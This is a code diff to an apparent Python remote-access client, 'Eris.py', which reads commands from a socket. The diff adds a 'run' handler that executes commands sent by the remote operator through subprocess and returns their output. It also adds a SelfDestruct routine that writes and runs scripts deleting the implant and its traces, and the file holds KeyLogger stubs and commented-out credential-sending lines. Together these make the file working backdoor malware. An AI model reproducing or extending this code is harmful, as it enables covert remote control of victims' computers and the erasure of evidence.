@@ -113,7 +113,10 @@ def Start_Client():
                 filename = command.split(b" ")[3]
                 DownloadFile(filename, sock)
                 continue
-
+            if command.__contains__(b"run"):
+                command = command.decode("utf-8")
+                code = command.split(" ")[3:]
+                Run(code, sock)
         # sock.sendall(cred)
         # print(cred)
 
@@ -214,12 +217,37 @@ def DownloadFile(filename, sock):
     sock.send(f"file {filename} uploaded".encode())
 
 
-def Run():
-    pass
+def Run(code, sock):
+    sock.send("running...".encode())
+    try:
+        output = subprocess.run(code, capture_output=True)
+        sock.send(output.stdout)
+    except Exception as E:
+        sock.send(str(E).encode())
 
 
 def KeyLogger():
     pass
+
+
+def SelfDestruct():
+    global os_type
+    command_tux = "echo 'rm .CID;rm Eris.py;rm .selfdestruct.sh;' >.selfdestruct.sh"
+    command_win = (
+        "echo '@echo off; DEL .CID; DEL Eris.py; DEL %~f0'; > .selfdestruct.bat"
+    )
+    if os_type == "Linux":
+        try:
+            os.system(command_tux)
+            subprocess.run(["sh", ".selfdestruct.sh"])
+        except Exception:
+            pass
+    elif os_type == "Windows":
+        try:
+            os.system(command_win)
+            subprocess.run(["sh", ".selfdestruct.sh"])
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
